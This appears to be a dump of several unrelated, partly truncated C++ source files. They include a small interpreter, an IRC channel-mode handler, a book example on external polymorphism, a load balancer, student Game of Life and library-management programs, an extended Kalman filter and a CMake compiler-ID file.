    "#include <iostream>\n#include <string>\n\nusing namespace std;\n\nconst int TAM = 300;\n\nclass ListaEstatica {\nprivate:\n    string linhas[TAM];\n    int tamanho;\n\npublic:\n    ListaEstatica() {\n        tamanho = 0;\n    }\n\n    bool listaCheia() {\n        return tamanho == TAM;\n    }\n\n    void inserir(string linha) {\n        if (!listaCheia()) {\n            linhas[tamanho] = linha;\n            tamanho++;\n        }\n    }\n\n    string getLinha(int pos) {\n        return linhas[pos];\n    }\n};\n\nstruct No {\n    string funcao;\n    int posicao;\n    No* proximo;\n};\n\nclass PilhaDinamica {\nprivate:\n    No* topo;\n\npublic:\n    PilhaDinamica() {\n        topo = nullptr;\n    };\n\n    bool pilhaVazia() {\n        return topo == nullptr;\n    }\n\n    void empilhar(string func, int pos) {\n        No* auxiliar = new No;\n        auxiliar->funcao = func;\n        auxiliar->posicao = pos;\n        auxiliar->proximo = topo;\n        topo = auxiliar;\n    }\n\n    void desempilhar() {\n        if (!pilhaVazia()) {\n            No* auxiliar = topo;\n            topo = topo->proximo;\n            delete auxiliar;\n        }\n    }\n\n    string getFuncao() {\n        return topo->funcao;\n    }\n\n    int getPosicao() {\n        return topo->posicao;\n    }\n\n    void incrementarPosicao() {\n        topo->posicao += 1;\n    }\n};\n\nint buscaSequencialFuncoes(string linha, ListaEstatica lista) {\n    int i = 0;\n    while (i < TAM && linha != lista.getLinha(i).substr(0, 3)) {\n        i++;\n    }\n    return i;\n}\n\nint main() {\n    ListaEstatica lista;\n    PilhaDinamica pilha;\n\n    cout << \"+-----= Programa Nee =-----+\" << endl;\n\n    bool lendo = true;\n    while (lendo) {\n        string linha;\n        getline(cin, linha);\n        lista.inserir(linha);\n\n        if (linha.compare(\"~\") == 0) {\n            cout << \"teste\" << endl;\n            lendo = false;\n            // break; // N\u00e3o \u00e9 necess\u00e1rio mais, pois j\u00e1 temos \"lendo = false;\"\n        }\n    }\n\n    int posicaoInicial = buscaSequencialFuncoes(\"Z :\", lista);\n    if (posicaoInicial < TAM) {\n        pilha.empilhar(\"Z\", posicaoInicial);\n    }\n\n    while (!pilha.pilhaVazia()) {\n        int posicaoAtual = pilha.getPosicao();\n        string linhaLida = lista.getLinha(posicaoAtual);\n        \n        if (linhaLida.substr(1, 5).compare(\"PRINT\") == 0) {\n            cout << linhaLida.substr(6, 2);\n            pilha.incrementarPosicao();\n        } else if (linhaLida.empty()) {\n            pilha.desempilhar();\n        } else {\n            int novaPosicao = buscaSequencialFuncoes(linhaLida.substr(0, 3), lista);\n            if (novaPosicao < TAM) {\n                pilha.empilhar(linhaLida.substr(0, 3), novaPosicao);\n            } else {\n                pilha.desempilhar();\n            }\n        }\n    }\n\n    return 0;\n}\n",
    "#include \"Irc.hpp\"\n#include \"Channel.hpp\"\n#include \"Server.hpp\"\n#include \"Commands.hpp\"\n\nvoid   limitChannelMode(Server *server, std::string datas[4], int const client_fd)\n{\n    if (server->isChannel(datas[1]) == false)\n    {\n        addToClientBuffer(server, client_fd, ERR_NOSUCHCHANNEL(datas[0], datas[1]));\n        return ;\n    }\n    std::map<std::string, Channel>::iterator it;\n    it = server->getChannels().find(datas[1]);\n    int limit = atoi(datas[3].c_str());\n    if (datas[2][0] == '+')\n    {\n\t\t// check limit is valid\n\t\tif (limit < 0 || (int)it->second.getClientList().size() > limit)\n\t\t\treturn ;\n        it->second.setCapacityLimit(limit);\n\t\tsize_t pos = it->second.getMode().find(\"l\");\n\t\tif (pos != std::string::npos) // le mode est deja pr\u00e9sent\n\t\t\treturn;\n\t\tit->second.addMode(\"l\");\n        // convert integer in a string because can't use std::tostring in C++98\n        std::ostringstream ss; \n        ss << limit;\n\t\tbroadcastToAllChannelMembers(server, it->second, MODE_CHANNELMSGWITHPARAM(datas[1], \"+l\", ss.str()));\n    }\n    else if (datas[2][0] == '-')\n    {\n        limit = -1;\n        it->second.setCapacityLimit(limit);\n\t\tsize_t pos = it->second.getMode().find(\"l\");\n\t\tif (pos == std::string::npos) // le mode est pas pr\u00e9sent\n\t\t\treturn;\n\t\tit->second.removeMode(\"l\");\n\t\tbroadcastToAllChannelMembers(server, it->second, MODE_CHANNELMSG(datas[1], \"-l\"));\n    }\n}",
    "/**************************************************************************************************\n*\n* \\file G31_External_Polymorphism.cpp\n* \\brief Guideline 31: Use External Polymorphism for Nonintrusive Runtime Polymorphism\n*\n* Copyright (C) 2022 Klaus Iglberger - All Rights Reserved\n*\n* This file is part of the supplemental material for the O'Reilly book \"C++ Software Design\"\n* (https://www.oreilly.com/library/view/c-software-design/9781098113155/).\n*\n**************************************************************************************************/\n\n\n//---- <Circle.h> ---------------------------------------------------------------------------------\n\nclass Circle\n{\n public:\n   explicit Circle( double radius )\n      : radius_( radius )\n   {\n      /* Checking that the given radius is valid */\n   }\n\n   double radius() const { return radius_; }\n   /* Several more getters and circle-specific utility functions */\n\n private:\n   double radius_;\n   /* Several more data members */\n};\n\n\n//---- <Square.h> ---------------------------------------------------------------------------------\n\nclass Square\n{\n public:\n   explicit Square( double side )\n      : side_( side )\n   {\n      /* Checking that the given side length is valid */\n   }\n\n   double side() const { return side_; }\n   /* Several more getters and square-specific utility functions */\n\n private:\n   double side_;\n   /* Several more data members */\n};\n\n\n//---- <Shape.h> ----------------------------------------------------------------------------------\n\n#include <functional>\n#include <stdexcept>\n#include <utility>\n\nclass ShapeConcept\n{\n public:\n   virtual ~ShapeConcept() = default;\n\n   virtual void draw() const = 0;\n\n   // ... Potentially more polymorphic operations\n};\n\n\ntemplate< typename ShapeT\n        , typename DrawStrategy >\nclass ShapeModel : public ShapeConcept\n{\n public:\n   explicit ShapeModel( ShapeT shape, DrawStrategy drawer )\n      : shape_{ std::move(shape) }\n      , drawer_{ std::move(drawer) }\n   {}\n\n   void draw() const override { drawer_(shape_); }\n\n private:\n   ShapeT shape_;\n   DrawStrategy drawer_;\n};\n\n\n//---- <OpenGLDrawStrategy.h> ---------------------------------------------------------------------\n\n//#include <Circle.h>\n//#include <Square.h>\n//#include /* OpenGL graphics library headers */\n\nclass OpenGLDrawStrategy\n{\n public:\n   explicit OpenGLDrawStrategy( /* Drawing related arguments */ )\n   {}\n\n   void operator()( Circle const& circle ) const\n   {\n      // ... Implementing the logic for drawing a circle by means of OpenGL\n   }\n   void operator()( Square const& square ) const\n   {\n      // ... Implementing the logic for drawing a square by means of OpenGL\n   }\n\n private:\n   /* Drawing related data members, e.g., colors, textures, ... */\n};\n\n\n//---- <Main.cpp> ---------------------------------------------------------------------------------\n\n//#include <Circle.h>\n//#include <Square.h>\n//#include <Shape.h>\n//#include <OpenGLDrawStrategy.h>\n#include <memory>\n#include <vector>\n\nint main()\n{\n   using Shapes = std::vector<std::unique_ptr<ShapeConcept>>;\n\n   using CircleModel = ShapeModel<Circle,OpenGLDrawStrategy>;\n   using SquareModel = ShapeModel<Square,OpenGLDrawStrategy>;\n\n   Shapes shapes{};\n\n   // Creating some shapes, each one\n   //   equipped with an OpenGL drawing strategy\n   shapes.emplace_back(\n      std::make_unique<CircleModel>(\n         Circle{2.3}, OpenGLDrawStrategy(/*...red...*/) ) );\n   shapes.emplace_back(\n      std::make_unique<SquareModel>(\n         Square{1.2}, OpenGLDrawStrategy(/*...green...*/) ) );\n   shapes.emplace_back(\n      std::make_unique<CircleModel>(\n         Circle{4.1}, OpenGLDrawStrategy(/*...blue...*/) ) );\n\n   // Drawing all shapes\n   for( auto const& shape : shapes )\n   {\n      shape->draw();\n   }\n\n   return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <unordered_map>\n#include <vector>\n#include <random>\n#include <algorithm>\n\nclass LeastConnections \n{\n  private:\n      std::unordered_map<std::string, int> servers;\n      std::random_device rd;\n      std::mt19937 gen;\n  \n  public:\n      LeastConnections(const std::vector<std::string>& serverList) : gen(rd()) \n      {\n          for (const auto& server : serverList) \n          {\n              servers[server] = 0;\n          }\n      }\n  \n      std::string getNextServer() \n      {\n          // Find the minimum number of connections\n          int minConnections = std::min_element(servers.begin(), servers.end(),\n                                                [](const auto& p1, const auto& p2) {\n                                                    return p1.second < p2.second;\n                                                })->second;\n  \n          // Get all servers with the minimum number of connections\n          std::vector<std::string> leastLoadedServers;\n          for (const auto& [server, connections] : servers) \n          {\n              if (connections == minConnections) \n              {\n                  leastLoadedServers.push_back(server);\n              }\n          }\n  \n          // Select a random server from the least loaded servers\n          std::uniform_int_distribution<> dis(0, leastLoadedServers.size() - 1);\n          std::string selectedServer = leastLoadedServers[dis(gen)];\n          servers[selectedServer]++;\n          return selectedServer;\n      }\n  \n      void releaseConnection(const std::string& server) \n      {\n          if (servers[server] > 0) \n          {\n              servers[server]--;\n          }\n      }\n};\n\nint main() \n{\n    std::vector<std::string> servers = {\"Server1\", \"Server2\", \"Server3\"};\n    LeastConnections loadBalancer(servers);\n\n    for (int i = 0; i < 6; ++i) \n    {\n        std::string server = loadBalancer.getNextServer();\n        std::cout << \"Request \" << i + 1 << \" -> \" << server << std::endl;\n        loadBalancer.releaseConnection(server);\n    }\n\n    return 0;\n}\n",
    "// Muhammad Noor \r\n// I23-2520\r\n// AI-B\r\n\r\n#include <iostream>\r\n#include <fstream>\r\n#include <string>\r\n#include <iomanip>\r\n#include <sstream>\r\n\r\nusing namespace std;\r\n\r\nvoid Print_Menu ();                                                      //  prints the menu for the user to choose.  \r\n\r\nint User_Choice() ;                                                       // enables user to pick his option .\r\n\r\nvoid  reading_file(const string &);                                       // reads and writes data to file.\r\n \r\nvoid Makegrid( int ) ;                                                  // make grid initializes the grid to 0 .\r\n\r\nvoid UpdateGrid ( int , int ) ;                                             // update grid transfroms the grid to 0 or 1 checking if its alive or not.\r\n    \r\nvoid start () {                                                            // called within main , start begins the game.\r\n\r\n\r\n  Print_Menu();\r\n  \r\n  int option = 0;\r\n  \r\n  option = User_Choice();                                                 // option is choosen from the user choices.\r\n  \r\n  if (option == 2) {                                                         // if user picks 2 , game ends.\r\n  \r\n  cout<< setw(10)<<\"\\t\"<<\"Exiting from the Game . \"<<endl<<endl;\r\n  }\r\n    \r\n  else if (option == 1) {                                                      // if user picks 1 , game starts.\r\n    string file_name ;\r\n    cout<<endl<<endl;\r\n\tcout << \"Enter the name of your file : \" ;\r\n\tcin >> file_name ;                                                    // allows the user to make a file of his own choice.\r\n  reading_file(file_name);\r\n  cout<<endl;                                                              // reading file func called to writing or reading.\r\n  \r\n  }\r\n  \r\n  else {\r\n  cout<<setw(10)<<\"\\t\"<<\"Error in Running . \"<<endl;\r\n  }\r\n\r\n  }\r\n  \r\n  int main () {\r\n  \r\n  start();                                                                    // called within main . only start used to make it look simple.\r\n    \r\n  return 0;\r\n  \r\n  }\r\n  \r\n  void Print_Menu() {\r\n  \r\n  cout<<setw(25)<<\"//////////////////GAME OF LIFE ///////////////////\"<<endl<<endl;\r\n  \r\n  cout<<setw(25)<< \" 1) START THE GAME  \"<<endl<<endl;                            // menu printed to the user to pick his choice.\r\n  \r\n  cout<<setw(25)<< \" 2) QUIT THE GAME   \"<<endl<<endl;\r\n  \r\n  }\r\n  \r\n   int Number_of_generations = 0;\r\n       int num_coordinate = 0; \r\n     const  int rows = 10 ;\r\n     const int columns = 10 ;\r\n      const int max_size = 20 ;                                                      // variable initialization to be used after here.\r\n      int grid[max_size][max_size];\r\n      int Grid2[max_size][max_size];                                                //second grid to store updated array\r\n    const int secondary_arr_size = 20;\r\n\tint secondary_arr[secondary_arr_size][2];\r\n\tconst int neighbouring_arr_size = 80 ;\r\n\tbool Alive_arr [secondary_arr_size][2] ; \r\n    int Neighbour_Array[neighbouring_arr_size][2]  = {};\r\n      int i , j = 1 ;\r\n\r\n  void reading_file(const string& file_name ) {\r\n     \r\n    ofstream out_file(file_name);\r\n    if (!out_file.is_open()) {                                                      // for writing purposes.\r\n    \r\n      cout << \" Error in opening file . \" <<endl;\r\n  }\r\n    cout<<endl<<endl;\r\n    cout<<\"Enter the number of generations you want in the game : \";\r\n    cin>>Number_of_generations;\r\n    \r\n    cout<<endl<<endl;\r\n    \r\n    \r\n   \r\n    cout<<\"How many coordinates you want to check : \" ; \r\n    \r\n    cin>>num_coordinate;\r\n    \r\n    cout << endl<<endl;\r\n    \r\n    out_file << Number_of_generations <<endl;                                      // writes the generations and coordinates onto the file.\r\n    out_file << num_coordinate << endl;\r\n    \r\n    int arr[num_coordinate][2] ;\r\n    \r\n    for ( int i = 0 ; i < num_coordinate ; i++ ) { \r\n    \r\n       cout<<\"Enter coordinates (x,y) : \" ; \r\n          \r\n       cin>>arr[i][0] ;                                                             // coordinates entered in a loop.\r\n\t   cin >> arr[i][1] ;\r\n    \r\n    //cout<<endl<<endl;\r\n        \r\n        out_file << arr[i][0]  << \" \" << arr[i][1] << endl;\r\n    \r\n    }\r\n   \r\n   \r\n    void Makegrid( int grid[max_size][max_size]    ) ;                                         //  prototypes.\r\n\r\n void UpdateGrid ( int grid[max_size][max_size] ,int num_coordinate , int arr[][2] , int Grid2[][max_size] ) ;           //  prototypes.\r\n    \r\n   void Check_Live ( int grid[max_size][max_size] , int num_coordinate, int arr[][2] ) ;          //  prototypes.\r\n    \r\n   void Copycells ( int num_coordinate ,  int grid[][max_size] , int arr[][2] , int Grid2[][max_size] , bool Alive_arr[][2]) ;          //  prototypes.\r\n   \r\n     int countL (int grid[][max_size] , int max_size , int i , int j , int rows , int columns ) ;             //  prototypes.\r\n     \r\n     int countS (int grid[][max_size] , int max_size , int i , int j , int rows , int columns ) ;           ",
    "#include <iostream>\n#include<string>\n#include<stdlib.h>\n#include<fstream>\n#include<cstring>\n#include<sstream>\n#include<ctime>\n#include<string.h>\n#include <cstdio>\n#include <iomanip>\n#include<bits/stdc++.h>\n#include<regex>\nusing namespace std;\n#define MAX 200\n\nint i=0,j=0,k1,k2,k3,k=0;\nstring users[MAX];\nstring passw[MAX];\nint stud[MAX];\nstring cho;\nstring lineu,linep,lines,temp,temp1;\n\nclass login\n{\nprivate:\n  string user;\n  string pass;\npublic:\n  int check();\n  string regis();\n  void disp();\n  void change_pass();\n  void exit();\n  void append();\n  int initial();\n};\n\nclass book\n{\nprivate:\n    int number;\npublic:\n    void due_details();\n    void check_in();\n    void check_out();\n    void date_enroll();\n    void reset_enroll();\n};\n\nclass student\n{\nprivate:\n    string stu_name;\n    int stu_id;\npublic:\n    void add_stu();\n    int edit_stu();\n    void view_det(int w);\n    void list_ofall();\n    int initial();\n};\n\n/// Add student to database for able to issue books\nvoid student :: add_stu()\n{\n  cout<<\"----------------------\"<<endl;\n  cout<<\"Enter the name of student to add: \";\n  cin>>stu_name;\n  cout<<\"Enter the student ID(only numbers): \";\n  cin>>stu_id;\n  cout<<\"----------------------\"<<endl;\n  fstream studentfile(\"stu.txt\",ios::app);\n  studentfile<<stu_name<<\" \";\n  studentfile<<stu_id<<endl;\n  stud[k]=stu_id;\n  studentfile.close();\n  k=k+1;\n}\n\n/// View the details of particular student\nvoid student :: view_det(int w)\n{\n  time_t tt;\n  struct tm * ti;\n  time (&tt);\n  ti = localtime(&tt);\n  time_t now = time(0);\n  struct tm *ltm = localtime(&now);\n\n  fstream studentfile(\"stu.txt\",ios::in);\n\n  cout<<endl;\n  int y=0;\n  while(y<k)\n  {\n    if(stud[y]==w)\n    {\n      break;\n    }\n    y++;\n  }\n  y=y+1;\n  if(y==k+1)\n  {\n    cout<<\"----------------------\"<<endl;\n    cout<<\"Not found\"<<endl;\n    cout<<\"----------------------\"<<endl;\n  }\n  else\n  {\n    cout<<\"----------------------\"<<endl;\n    cout<<\"The entered ID is in line no.: \"<<y<<endl;\n    fstream studentfile(\"stu.txt\",ios::in);\n    int lineno=0;\n    do\n    {\n        if (lineno == y)\n        {\n            cout <<\"Student name and ID: \"<<lines<< endl;\n            cout<<\"----------------------\"<<endl;\n            break;\n        }\n        lineno++;\n\n    }\n    while(getline(studentfile,lines));\n    fstream file (\"book.txt\",ios::in);\n    string str;\n    cout<<\"The list of checked out books under ID: \"<<w<<endl;\n    while(getline(file,str))\n    {\n      smatch matches;\n      regex reg2(\"([0-9]+)\");\n      regex_search(str,matches,reg2);\n      if(matches.str(1)==to_string(w))\n      {\n        regex reg(\"[0-9]+ (.*)\");\n        sregex_iterator currentmatch(str.begin(),str.end(),reg);\n        sregex_iterator lastmatch;\n        \n        while(currentmatch!=lastmatch)\n        {\n            smatch match=*currentmatch;\n            cout<<matches.str(1)<<\": \"<<match.str()<<endl;\n\n            smatch mat;\n            regex rew(\"[0-9A-Za-z .]*([0-9][0-9]/[0-9][0-9]/[0-9][0-9][0-9][0-9])\");\n            regex_search(str,mat,rew);\n            if(regex_search(str,mat,rew))\n            {\n              string k;\n              k=mat.str(1);\n\n              // Checking for fine starts //\n              int date1,month1,year1;\n              smatch date2;smatch month2;smatch year2;\n              regex reg1(\"([0-9][0-9])/[0-9][0-9]/[0-9][0-9][0-9][0-9]\");\n              regex reg2(\"[0-9][0-9]/([0-9][0-9])/[0-9][0-9][0-9][0-9]\");\n              regex reg3(\"[0-9][0-9]/[0-9][0-9]/([0-9][0-9][0-9][0-9])\");\n              regex_search(k,date2,reg1);\n              regex_search(k,month2,reg2);\n              regex_search(k,year2,reg3);\n              int temp_date,temp_month,temp_year;\n              smatch matches;\n              regex reg(\"([0-9][0-9]/[0-9][0-9]/[0-9][0-9][0-9][0-9])\");\n              regex_search(k,matches,reg);\n\n              if(regex_search(k,matches,reg))\n              {\n                if(stoi(year2[1]) < 1900+ltm->tm_year)\n                {\n                  cout<<\"---> Passed by year. Huge Fine has to be paid for this book\"<<endl;\n                }\n                else if(stoi(year2[1]) > 1900+ltm->tm_year)\n                {\n                  cout<<\"---> The check in date will come soon. No need to worry\"<<endl;\n                }\n                else\n                {\n                  if(stoi(month2[1]) < 1+ltm->tm_mon)\n                  {\n                    cout<<\"---> Passed by month. Huge Fine has to be paid for this book\"<<endl;\n                  }\n                  else if(stoi(month2[1]) > 1+ltm->tm_mon)\n                  {\n                    cout<<\"---> The check in date will come soon. No need to worry\"<<endl;\n                  }\n                  else\n                  {\n                    if(stoi(date2[1]) < ltm->tm_mday)\n                    {\n                      cout<<\"---> Passed by date. Fine has to be paid for the this book\"<<endl;\n                    }\n                    else if(stoi(date2[1]) > ltm->tm_mday)\n                    {\n                      cout<<\"---> The ",
    "#include \"EKF.h\"\r\n#include <cmath>\r\n\r\nusing namespace Eigen;\r\n\r\nEKF::EKF() {\r\n    Vector4d quaternion(1, 0, 0, 0);\r\n    Vector3d bias(0, 0, 0);\r\n\r\n    xHat.resize(7);\r\n    xHat << quaternion, bias;\r\n    yHatBar.resize(3);\r\n    yHatBar.setZero();\r\n    p = MatrixXd::Identity(7, 7) * 0.01;\r\n    Q = MatrixXd::Identity(7, 7) * 0.001;\r\n    R = MatrixXd::Identity(6, 6) * 0.1;\r\n    accelReference << 0, 0, -1;\r\n    magReference << 0, -1, 0;\r\n    mag_Ainv << 2.06423128e-03, -1.04778851e-04, -1.09416190e-06,\r\n                -1.04778851e-04, 1.91693168e-03, 1.79409312e-05,\r\n                -1.09416190e-06, 1.79409312e-05, 1.99819154e-03;\r\n    mag_b << 80.51340236, 37.08931099, 105.6731885;\r\n}\r\n\r\nVector4d EKF::normalizeQuat(Vector4d q) {\r\n    return q / q.norm();\r\n}\r\n\r\nVector3d EKF::getAccelVector(Vector3d a) {\r\n    return a / a.norm();\r\n}\r\n\r\nVector3d EKF::getMagVector(Vector3d m) {\r\n    Vector3d magGaussRaw = mag_Ainv * (m - mag_b);\r\n    Vector3d magGauss_N = getRotMat(xHat.head<4>()) * magGaussRaw;\r\n    magGauss_N(2) = 0;\r\n    return (getRotMat(xHat.head<4>()).transpose() * magGauss_N).normalized();\r\n}\r\n\r\nMatrix3d EKF::getRotMat(Vector4d q) {\r\n    double c00 = q(0) * q(0) + q(1) * q(1) - q(2) * q(2) - q(3) * q(3);\r\n    double c01 = 2 * (q(1) * q(2) - q(0) * q(3));\r\n    double c02 = 2 * (q(1) * q(3) + q(0) * q(2));\r\n    double c10 = 2 * (q(1) * q(2) + q(0) * q(3));\r\n    double c11 = q(0) * q(0) - q(1) * q(1) + q(2) * q(2) - q(3) * q(3);\r\n    double c12 = 2 * (q(2) * q(3) - q(0) * q(1));\r\n    double c20 = 2 * (q(1) * q(3) - q(0) * q(2));\r\n    double c21 = 2 * (q(2) * q(3) + q(0) * q(1));\r\n    double c22 = q(0) * q(0) - q(1) * q(1) - q(2) * q(2) + q(3) * q(3);\r\n\r\n    Matrix3d rotMat;\r\n    rotMat << c00, c01, c02,\r\n              c10, c11, c12,\r\n              c20, c21, c22;\r\n\r\n    return rotMat;\r\n}\r\n\r\nMatrixXd EKF::getJacobianMatrix(Vector3d reference) {\r\n    Vector4d qHatPrev = xHatPrev.head<4>();\r\n    MatrixXd jacobianMatrix(3, 4);\r\n    jacobianMatrix <<\r\n        qHatPrev(0) * reference(0) + qHatPrev(3) * reference(1) - qHatPrev(2) * reference(2),\r\n        qHatPrev(1) * reference(0) + qHatPrev(2) * reference(1) + qHatPrev(3) * reference(2),\r\n        -qHatPrev(2) * reference(0) + qHatPrev(1) * reference(1) - qHatPrev(0) * reference(2),\r\n        -qHatPrev(3) * reference(0) + qHatPrev(0) * reference(1) + qHatPrev(1) * reference(2),\r\n        -qHatPrev(3) * reference(0) + qHatPrev(0) * reference(1) + qHatPrev(1) * reference(2),\r\n        qHatPrev(2) * reference(0) - qHatPrev(1) * reference(1) + qHatPrev(0) * reference(2),\r\n        qHatPrev(1) * reference(0) + qHatPrev(2) * reference(1) + qHatPrev(3) * reference(2),\r\n        -qHatPrev(0) * reference(0) - qHatPrev(3) * reference(1) + qHatPrev(2) * reference(2),\r\n        qHatPrev(2) * reference(0) - qHatPrev(1) * reference(1) + qHatPrev(0) * reference(2),\r\n        qHatPrev(3) * reference(0) - qHatPrev(0) * reference(1) - qHatPrev(1) * reference(2),\r\n        qHatPrev(0) * reference(0) + qHatPrev(3) * reference(1) - qHatPrev(2) * reference(2),\r\n        qHatPrev(1) * reference(0) + qHatPrev(2) * reference(1) + qHatPrev(3) * reference(2);\r\n    return 2 * jacobianMatrix;\r\n}\r\n\r\nVectorXd EKF::predictAccelMag() {\r\n    MatrixXd hPrime_a = getJacobianMatrix(accelReference);\r\n    Vector3d accelBar = getRotMat(xHatBar.head<4>()).transpose() * accelReference;\r\n    MatrixXd hPrime_m = getJacobianMatrix(magReference);\r\n    Vector3d magBar = getRotMat(xHatBar.head<4>()).transpose() * magReference;\r\n\r\n    MatrixXd tmp1(3, 7);\r\n    tmp1 << hPrime_a, MatrixXd::Zero(3, 3);\r\n    MatrixXd tmp2(3, 7);\r\n    tmp2 << hPrime_m, MatrixXd::Zero(3, 3);\r\n    C.resize(6, 7);\r\n    C << tmp1, tmp2;\r\n\r\n    VectorXd result(6);\r\n    result << accelBar, magBar;\r\n    return result;\r\n}\r\n\r\nvoid EKF::predict(Vector3d w, double dt) {\r\n    Vector4d q = xHat.head<4>();\r\n    MatrixXd Sq(4, 3);\r\n    Sq << -q(1), -q(2), -q(3),\r\n           q(0), -q(3),  q(2),\r\n           q(3),  q(0), -q(1),\r\n          -q(2),  q(1),  q(0);\r\n    MatrixXd tmp1(4, 7);\r\n    tmp1 << MatrixXd::Identity(4, 4), -dt / 2 * Sq;\r\n    MatrixXd tmp2(3, 7);\r\n    tmp2 << MatrixXd::Zero(3, 4), MatrixXd::Identity(3, 3);\r\n    A.resize(7, 7);\r\n    A << tmp1, tmp2;\r\n    B.resize(7, 3);\r\n    B << dt / 2 * Sq, MatrixXd::Zero(3, 3);\r\n\r\n    xHatBar = A * xHat + B * w;\r\n    xHatBar.head<4>() = normalizeQuat(xHatBar.head<4>());\r\n    xHatPrev = xHat;\r\n\r\n    yHatBar = predictAccelMag();\r\n    p = A * p * A.transpose() + Q;\r\n}\r\n\r\nvoid EKF::update(Vector3d a, Vector3d m) {\r\n    MatrixXd tmp1 = (C * p * C.transpose() + R).inverse();\r\n    K = p * C.transpose() * tmp1;\r\n\r\n    Vector3d magGuass_B = getMagVector(m);\r\n    Vector3d accel_B = getAccelVector(a);\r\n\r\n    VectorXd measurement(6);\r\n    measurement << accel_B, magGuass_B;\r\n    xHat = xHatBar + K * (measurement - yHatBar);\r\n    xHat.head<4>() = normalizeQuat(xHat.head<4>());\r\n    p = (MatrixXd::Identity(7, 7) - K * C) * p;\r\n}\r\n\r\nVector3d EKF::getEulerAngles(Vector4d q) {\r\n    Matrix3d m = getRotMat(q);\r\n    double test = -m",
    "/* This source file must have a .cpp extension so that all C++ compilers\r\n   recognize the extension without flags.  Borland does not know .cxx for\r\n   example.  */\r\n#ifndef __cplusplus\r\n# error \"A C compiler has been selected for C++.\"\r\n#endif\r\n\r\n#if !defined(__has_include)\r\n/* If the compiler does not have __has_include, pretend the answer is\r\n   always no.  */\r\n#  define __has_include(x) 0\r\n#endif\r\n\r\n\r\n/* Version number components: V=Version, R=Revision, P=Patch\r\n   Version date components:   YYYY=Year, MM=Month,   DD=Day  */\r\n\r\n#if defined(__COMO__)\r\n# define COMPILER_ID \"Comeau\"\r\n  /* __COMO_VERSION__ = VRR */\r\n# define COMPILER_VERSION_MAJOR DEC(__COMO_VERSION__ / 100)\r\n# define COMPILER_VERSION_MINOR DEC(__COMO_VERSION__ % 100)\r\n\r\n#elif defined(__INTEL_COMPILER) || defined(__ICC)\r\n# define COMPILER_ID \"Intel\"\r\n# if defined(_MSC_VER)\r\n#  define SIMULATE_ID \"MSVC\"\r\n# endif\r\n# if defined(__GNUC__)\r\n#  define SIMULATE_ID \"GNU\"\r\n# endif\r\n  /* __INTEL_COMPILER = VRP prior to 2021, and then VVVV for 2021 and later,\r\n     except that a few beta releases use the old format with V=2021.  */\r\n# if __INTEL_COMPILER < 2021 || __INTEL_COMPILER == 202110 || __INTEL_COMPILER == 202111\r\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER/100)\r\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER/10 % 10)\r\n#  if defined(__INTEL_COMPILER_UPDATE)\r\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER_UPDATE)\r\n#  else\r\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER   % 10)\r\n#  endif\r\n# else\r\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER)\r\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER_UPDATE)\r\n   /* The third version component from --version is an update index,\r\n      but no macro is provided for it.  */\r\n#  define COMPILER_VERSION_PATCH DEC(0)\r\n# endif\r\n# if defined(__INTEL_COMPILER_BUILD_DATE)\r\n   /* __INTEL_COMPILER_BUILD_DATE = YYYYMMDD */\r\n#  define COMPILER_VERSION_TWEAK DEC(__INTEL_COMPILER_BUILD_DATE)\r\n# endif\r\n# if defined(_MSC_VER)\r\n   /* _MSC_VER = VVRR */\r\n#  define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\r\n#  define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\r\n# endif\r\n# if defined(__GNUC__)\r\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\r\n# elif defined(__GNUG__)\r\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\r\n# endif\r\n# if defined(__GNUC_MINOR__)\r\n#  define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\r\n# endif\r\n# if defined(__GNUC_PATCHLEVEL__)\r\n#  define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\r\n# endif\r\n\r\n#elif (defined(__clang__) && defined(__INTEL_CLANG_COMPILER)) || defined(__INTEL_LLVM_COMPILER)\r\n# define COMPILER_ID \"IntelLLVM\"\r\n#if defined(_MSC_VER)\r\n# define SIMULATE_ID \"MSVC\"\r\n#endif\r\n#if defined(__GNUC__)\r\n# define SIMULATE_ID \"GNU\"\r\n#endif\r\n/* __INTEL_LLVM_COMPILER = VVVVRP prior to 2021.2.0, VVVVRRPP for 2021.2.0 and\r\n * later.  Look for 6 digit vs. 8 digit version number to decide encoding.\r\n * VVVV is no smaller than the current year when a version is released.\r\n */\r\n#if __INTEL_LLVM_COMPILER < 1000000L\r\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/100)\r\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/10 % 10)\r\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER    % 10)\r\n#else\r\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/10000)\r\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/100 % 100)\r\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER     % 100)\r\n#endif\r\n#if defined(_MSC_VER)\r\n  /* _MSC_VER = VVRR */\r\n# define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\r\n# define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\r\n#endif\r\n#if defined(__GNUC__)\r\n# define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\r\n#elif defined(__GNUG__)\r\n# define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\r\n#endif\r\n#if defined(__GNUC_MINOR__)\r\n# define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\r\n#endif\r\n#if defined(__GNUC_PATCHLEVEL__)\r\n# define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\r\n#endif\r\n\r\n#elif defined(__PATHCC__)\r\n# define COMPILER_ID \"PathScale\"\r\n# define COMPILER_VERSION_MAJOR DEC(__PATHCC__)\r\n# define COMPILER_VERSION_MINOR DEC(__PATHCC_MINOR__)\r\n# if 